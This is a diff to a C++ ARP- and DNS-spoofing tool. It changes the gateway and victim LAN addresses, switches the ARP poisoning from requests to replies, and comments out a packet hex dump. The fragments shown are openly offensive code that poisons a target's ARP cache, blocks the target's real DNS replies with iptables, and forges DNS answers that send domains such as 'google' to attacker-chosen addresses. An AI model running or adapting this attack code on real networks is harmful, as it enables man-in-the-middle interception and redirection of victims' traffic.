@@ -64,8 +64,8 @@ int main() {
 	HostInfo* host_info = new HostInfo;
 
 	/* IP addresses -> This is a data supply by the user */
-	string dns_ip = "192.168.1.1"; short_word dst_port = 53; /* DNS traffic */
-	string victim_ip = "192.168.1.5";
+	string dns_ip = "192.168.0.1"; short_word dst_port = 53; /* DNS traffic */
+	string victim_ip = "192.168.0.108";
 
 	/* List of addresses -> This also is data supplied by the user */
 	spoof_list["google"] = "1.2.3.4";
@@ -83,7 +83,7 @@ int main() {
 	iptables_block(iface,victim_ip,dst_port);
 
 	/* Start the ARP spoofing */
-	ARPContext* context = ARPSpoofingRequest(dns_ip,victim_ip,iface);
+	ARPContext* context = ARPSpoofingReply(dns_ip,victim_ip,iface);
 
 	/* Print data about the spoofing, and wait a few seconds */
 	PrintARPContext(*context);
@@ -223,7 +223,7 @@ void DNSSpoofer(Packet* sniff_packet, void* user) {
 
 				/* After modifying the layers, write the packet on the wire */
 				sniff_packet->Send(host_data->iface);
-
+				//sniff_packet->HexDump();
 			} else {
 
 				/* Send the packet to the dns */
